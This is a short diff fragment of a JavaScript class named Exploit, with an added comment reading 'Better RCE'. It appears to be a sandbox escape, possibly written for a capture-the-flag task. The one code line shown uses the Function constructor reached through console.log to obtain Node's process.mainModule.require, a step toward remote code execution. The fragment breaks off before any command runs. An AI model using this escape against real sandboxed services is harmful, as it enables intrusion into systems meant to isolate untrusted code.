@@ -1,3 +1,5 @@
+<!-- ############# Better RCE ################### -->
+
 class Exploit {
   process_incoming_request({ request }) {
     const a = console.log.constructor('return process.mainModule.require')();
